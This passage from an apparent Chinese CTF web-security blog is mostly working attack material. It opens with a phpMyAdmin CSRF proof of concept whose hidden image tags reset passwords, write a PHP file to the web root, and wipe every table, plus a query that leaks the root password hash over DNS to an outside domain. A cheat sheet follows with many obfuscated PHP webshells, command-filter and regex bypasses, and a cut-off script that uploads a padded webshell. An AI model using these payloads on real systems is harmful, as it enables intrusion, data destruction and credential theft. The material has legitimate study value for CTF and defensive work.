 </span><br><span class="line"><span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">5</span>  </span><br><span class="line"><span class="symbol">Phpmyadmin:</span><span class="number">4.7</span>.<span class="number">4</span>  </span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: phpMyAdmin 4.7.x - Cross-Site Request Forgery</span></span><br><span class="line"><span class="comment"># Date: 2018-08-28</span></span><br><span class="line"><span class="comment"># Exploit Author: VulnSpy</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.phpmyadmin.net/</span></span><br><span class="line"><span class="comment"># Software Link: https://www.phpmyadmin.net/downloads/</span></span><br><span class="line"><span class="comment"># Version: Versions 4.7.x (prior to 4.7.7)</span></span><br><span class="line"><span class="comment"># Tested on: php7 mysql5</span></span><br><span class="line"><span class="comment"># CVE: CVE-2017-1000499</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit CSRF - Modifying the password of current user</span></span><br><span class="line"></span><br><span class="line">&lt;p&gt;Hello World&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=&quot;</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/7f366ec1afc5832757a402b5355132d0.vsplate.me/s</span>ql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password</span><br><span class="line">%20=%20PASSWORD(%27www.vulnspy.com%27)<span class="string">&quot; style=&quot;</span>display:none;<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Exploit CSRF - Arbitrary File Write</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">7</span>f366ec1afc5832757a402b5355132d<span class="number">0</span>.vsplate.me/sql.php?db=mysql&amp;table=user&amp;sql_query=<span class="keyword">select</span></span><br><span class="line"><span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/test.php&#x27;</span>;<span class="string">&quot;</span></span><br><span class="line"><span class="string">style=&quot;</span>display:none;<span class="string">&quot; /&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Exploit CSRF - Data Retrieval over DNS</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(SELECT password FROM mysql.user WHERE</span></span><br><span class="line"><span class="string">user=&#x27;root&#x27; LIMIT 1),&#x27;.vulnspy.com\\test&#x27;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Exploit CSRF - Empty All Rows From All Tables</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;p&gt;Hello World&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">7</span>f366ec1afc5832757a402b5355132d<span class="number">0</span>.vsplate.me/import.php?db=mysql&amp;table=user&amp;sql_query=DROP+PROCEDURE+IF+EXISTS+EMPT%<span class="number">3</span>B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%<span class="number">3</span>B%0A++++++++SET+i+%3D+<span class="number">0</span>%<span class="number">3</span>B%0A++++++++WHILE+i+%3C+<span class="number">100</span>+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%<span class="number">2</span>C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+<span class="keyword">and</span>+TABLE_SCHEMA%21%<span class="number">3</span>D%27mysql%27+LIMIT+i%2C1%29%<span class="number">3</span>B%0A++++++++++++PREPARE+STMT+FROM+%40del%<span class="number">3</span>B%0A++++++++++++EXECUTE+stmt%<span class="number">3</span>B%0A++++++++++++SET+i+%3D+i+%2B1%<span class="number">3</span>B%0A++++++++END+WHILE%<span class="number">3</span>B%0A++++END+%24%24%0ADELIMITER+%<span class="number">3</span>B%0A%0ACALL+EMPT%28%29%<span class="number">3</span>B%0A<span class="string">&quot;</span></span><br><span class="line"><span class="string">style=&quot;</span>display:none;<span class="string">&quot; /&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000499">CVE-2017-1000499</a></p><h1 id="4特殊版本GetShell"><a href="#4特殊版本GetShell" class="headerlink" title="4特殊版本GetShell"></a>4特殊版本GetShell</h1><h2 id="4-1-CVE-2013-3238"><a href="#4-1-CVE-2013-3238" class="headerlink" title="4.1 CVE-2013-3238"></a>4.1 CVE-2013-3238</h2><blockquote><p> 影响版本：3.5.x &lt; 3.5.8.1 and 4.0.0 &lt; 4.0.0-rc3 ANYUN.ORG</p><p> 利用模块：exploit&#x2F;multi&#x2F;http&#x2F;phpmyadminpregreplace</p></blockquote><h2 id="4-2-CVE-2012-5159"><a href="#4-2-CVE-2012-5159" class="headerlink" title="4.2 CVE-2012-5159"></a>4.2 CVE-2012-5159</h2><blockquote><p> 影响版本：phpMyAdmin v3.5.2.2</p><p> 利用模块：exploit&#x2F;multi&#x2F;http&#x2F;phpmyadmin3522_backdoor</p></blockquote><h2 id="4-3-CVE-2009-1151"><a href="#4-3-CVE-2009-1151" class="headerlink" title="4.3 CVE-2009-1151"></a>4.3 CVE-2009-1151</h2><blockquote><p> PhpMyAdmin配置文件&#x2F;config&#x2F;config.inc.php存在命令执行</p><p> 影响版本：2.11.x &lt; 2.11.9.5 and 3.x &lt; 3.1.3.1</p><p> 利用模块：exploit&#x2F;unix&#x2F;webapp&#x2F;phpmyadmin_config</p></blockquote><h2 id="4-4-弱口令-amp-万能密码"><a href="#4-4-弱口令-amp-万能密码" class="headerlink" title="4.4 弱口令&amp;万能密码"></a>4.4 弱口令&amp;万能密码</h2><blockquote><p> 弱口令：版本phpmyadmin2.11.9.2， 直接root用户登陆，无需密码</p><p> 万能密码：版本2.11.3 &#x2F; 2.11.4，用户名‘localhost‘@‘@”则登录成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web安全 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用bypass（待更新）</title>
      <link href="/post/ef088674.html"/>
      <url>/post/ef088674.html</url>
      
        <content type="html"><![CDATA[<h1 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$IFS $&#123;IFS&#125;  $IFS$9</span><br><span class="line">&lt;  </span><br><span class="line">&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;,&#125;</span><br><span class="line">%20(空格的url编码)</span><br><span class="line">%09(tab的url编码)</span><br><span class="line">%0a,%0b,%0c,%0d,%a0</span><br><span class="line"></span><br><span class="line">/**/   SQL中</span><br><span class="line">括号括起来   SQL中</span><br></pre></td></tr></table></figure><h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h3 id="常规的一句话木马"><a href="#常规的一句话木马" class="headerlink" title="常规的一句话木马:"></a>常规的一句话木马:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//php字符被过滤时:</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="php短标签"><a href="#php短标签" class="headerlink" title="php短标签"></a>php短标签</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure><h3 id="使用其他函数"><a href="#使用其他函数" class="headerlink" title="使用其他函数:"></a>使用其他函数:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">assert</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="variable">$fun</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//这里@call_user_func可以用来调用其他函数,第一个参数是它调用的函数,第二个函数是调用函数的参数</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/abcde/e&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>], <span class="string">&quot;abcdefg&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能——可执行命令。</span></span><br><span class="line"><span class="comment">//这个函数的第一个参数是正则表达式，按照PHP的格式，表达式在两个“/”之间。如果我们在这个表达式的末尾加上“e”，那么这个函数的第二个参数就会被当作代码执行。</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="string">&#x27;&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;Trojan.php&quot;</span>, <span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//这里是生成一个文件,第二个参数是文件的内容</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&quot;<span class="subst">$a</span>&quot;</span>,<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//这里利用array_map()函数将执行语句进行拼接。最终实现的是assert($_REQUEST)</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$item</span>[<span class="string">&#x27;JON&#x27;</span>]=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$array</span>[]=<span class="variable">$item</span>;</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>][<span class="string">&#x27;JON&#x27;</span>](<span class="variable">$_POST</span>[<span class="string">&quot;TEST&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量函数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//变量的嵌套</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$bb</span>=<span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="variable">$aa</span>=<span class="string">&quot;bb&quot;</span>;</span><br><span class="line"><span class="variable">$$aa</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//字符串的替换</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;Waldo&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;eWaldoval&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//base64</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;ZXZhbA==&quot;</span>)</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//利用.进行字符拼接</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;e&quot;</span>.<span class="string">&quot;v&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;a&quot;</span>.<span class="string">&quot;l&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&quot;a=eval&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//parse_str生成一个变量a,其值为eval.</span></span><br></pre></td></tr></table></figure><h3 id="结合其他数据来源"><a href="#结合其他数据来源" class="headerlink" title="结合其他数据来源:"></a>结合其他数据来源:</h3><ul><li>GET:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//a=eval&amp;b=$_POST[&#x27;a&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>( <span class="variable">$_GET</span>[<span class="variable">$_GET</span>[b]])&gt;</span><br><span class="line"><span class="comment">//b=cmd&amp;cmd=phpinfo()</span></span><br></pre></td></tr></table></figure><h3 id="其他标签"><a href="#其他标签" class="headerlink" title="其他标签:"></a>其他标签:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_GET[a]);&lt;/script&gt;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p>(另外,某个参数过滤的比较过分时,尝试引入其他的GET或POST参数来执行命令等)</p><p>执行系统命令时支持<code>*</code>,<code>?</code>等模糊查找,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat f*.php&quot;)</span><br><span class="line">system(&quot;cat fla?.php&quot;)</span><br><span class="line">system(&quot;cat fla&quot;&quot;g.php&quot;)</span><br><span class="line">tac&lt;fla&#x27;&#x27;g.php</span><br><span class="line">tac%09fla&#x27;&#x27;g.php</span><br></pre></td></tr></table></figure><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行:"></a>命令执行:</h1><h2 id="读文件-php-x2F-系统命令"><a href="#读文件-php-x2F-系统命令" class="headerlink" title="读文件(php&#x2F;系统命令)"></a>读文件(php&#x2F;系统命令)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">系统命令:</span><br><span class="line">cat flag.php</span><br><span class="line">more flag.php</span><br><span class="line">nl flag.php</span><br><span class="line">tac flag.php</span><br><span class="line">grep &#x27;&#123;&#x27; flag.php</span><br><span class="line">//grep(要查找的串,目标文件),这里相当于从flag.php中查找&#x27;&#123;&#x27;,查找到后输出结果所在的行,实际上也就相当于输出了flag</span><br><span class="line"></span><br><span class="line">php函数:</span><br><span class="line">file_get_contents(&quot;文件名&quot;)</span><br><span class="line">show_source()</span><br><span class="line">file_get_content()</span><br></pre></td></tr></table></figure><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">执行系统命令:</span><br><span class="line">system</span><br><span class="line">exec</span><br><span class="line">执行php命令</span><br><span class="line">eval</span><br><span class="line">assert</span><br></pre></td></tr></table></figure><p>另外,如果系统命令无法执行, 尝试用绝对路径来执行命令,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/cat /flag.txt</span><br></pre></td></tr></table></figure><h1 id="大写字母-x2F-小写字母"><a href="#大写字母-x2F-小写字母" class="headerlink" title="大写字母&#x2F;小写字母"></a>大写字母&#x2F;小写字母</h1><p>大写字母:<code>[@-[]</code> 这里的含义是:<code>ASCII</code>码表中, 大写字母在<code>@</code>和<code>[</code>之间</p><p>那么同理,小写字母就是: </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[`-&#123;]</span><br></pre></td></tr></table></figure><h1 id="无字母数字构建数字"><a href="#无字母数字构建数字" class="headerlink" title="无字母数字构建数字"></a>无字母数字构建数字</h1><p>Linux中:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(())表示0</span><br><span class="line">$((~0))表示-1 ,因此-1也可以表示为: $((~$(())))</span><br><span class="line">$((~ a))= -(a+1)   例如:$((~ -40))=$((~ 40个-1))=$((~ 40个$((~$(())))  ))= 39</span><br><span class="line">$((-1-1))=$(( $((~$(()))) $((~$(()))))) = -2</span><br><span class="line">$((3个-1))=$(($((~$(())))$((~$(())))$((~$(()))))) = -3</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><img src="/images/bypass/image-20221017221437656.png" alt="image-20221017221437656" style="zoom:67%;" /><h1 id="XFF头字段"><a href="#XFF头字段" class="headerlink" title="XFF头字段"></a>XFF头字段</h1><p><code>XFF</code>头不起作用的话,可以尝试下列头字段:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X-Forward-For</span><br><span class="line">X-client-IP</span><br><span class="line">X-Real-ip</span><br><span class="line">Client-IP</span><br></pre></td></tr></table></figure><h1 id="GET-POST中的中括号"><a href="#GET-POST中的中括号" class="headerlink" title="GET,POST中的中括号"></a>GET,POST中的中括号</h1><p>可以用花括号来代替,例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_GET&#123;0&#125;</span><br></pre></td></tr></table></figure><h1 id="php中preg-match正则匹配的绕过汇总"><a href="#php中preg-match正则匹配的绕过汇总" class="headerlink" title="php中preg_match正则匹配的绕过汇总"></a>php中preg_match正则匹配的绕过汇总</h1><p><strong>常用的修饰符</strong></p><table><thead><tr><th align="left">修饰符</th><th align="left">含义</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">i</td><td align="left">ignore - 不区分大小写</td><td align="left">将匹配设置为不区分大小写，搜索时不区分大小写: A 和 a 没有区别。</td></tr><tr><td align="left">g</td><td align="left">global - 全局匹配</td><td align="left">查找所有的匹配项。</td></tr><tr><td align="left">m</td><td align="left">multi line - 多行匹配</td><td align="left">preg_match</td></tr><tr><td align="left">s</td><td align="left">特殊字符圆点 <strong>.</strong> 中包含换行符 <strong>\n</strong></td><td align="left"><strong>默认情况下的圆点 . 是匹配除换行符 <code>\n</code> 之外的任何字符，加上 s 修饰符之后, . 中包含换行符<code> \n</code>。</strong></td></tr></tbody></table><p>其他修饰符和具体语法见<a href="5e7d3829.html">速查</a></p><h2 id="换行符绕过"><a href="#换行符绕过" class="headerlink" title="换行符绕过"></a>换行符绕过</h2><p>在不加修饰符<code>s</code>时, <code>.</code>是不匹配换行符的</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/^.*(flag).*$/&#x27;, $json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">匹配 任意多个字符+flag+任意多个字符</span><br><span class="line">这里传入: $json=&quot;\nflag&quot;  就可以绕过检测</span><br></pre></td></tr></table></figure><p>在不加修饰符<code>m</code>时, 不进行多行匹配, 即使正则表达式尾部加了 用于匹配结尾的<code>$</code>, 也匹配不到结尾的换行符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#x27;/^flag$/&#x27;, $_GET[&#x27;a&#x27;]) &amp;&amp; $_GET[&#x27;a&#x27;] !== &#x27;flag&#x27;) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">这里传:a=flag%0a  就可绕过</span><br></pre></td></tr></table></figure><h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a><strong>数组绕过</strong></h2><p><code>preg_match</code>只能处理字符串，当传入的是数组时会返回<code>false</code></p><h2 id="回溯次数限制"><a href="#回溯次数限制" class="headerlink" title="回溯次数限制"></a>回溯次数限制</h2><p><code>pcre.backtrack_limit</code>给php的正则匹配设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，<code>preg_match</code>会返回<code>false</code></p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">正则表达式为: &lt;\?.*[(`;?&gt;].*   </span><br><span class="line">输入为: &lt;?php phpinfo();//aaaaa</span><br></pre></td></tr></table></figure><p>实际匹配时的执行流程为:</p><img src="/images/bypass/12.png" alt="image-20221017221437656" style="zoom:67%;" /><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符需要匹配:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;].* </span><br></pre></td></tr></table></figure><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>&lt;?php phpinfo()</code>，此时，<code>.*</code>匹配的是<code>php phpinfo()</code>，而后面的<code>;</code>则匹配上则被后面的表达式匹配到，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配<code>;</code>，14步匹配<code>.*</code>，第二个<code>.*</code>匹配到了字符串末尾，最后结束匹配。</p><p>所以在上面的匹配过程中, 一共回溯了8次(第5步-第12步)</p><p><strong>那么如果在需要绕过的正则表达式中见到了<code>.*</code>这样的模式, 且后面还有其他模式需要匹配的, 就可以通过在输入的字符串末尾传入超长字符串的形式来触发回溯次数限制</strong></p><p>在对前面例子里的表达式的绕过中,就可以:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  <span class="string">&#x27;file&#x27;</span>: BytesIO(<span class="string">b&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>)</span><br><span 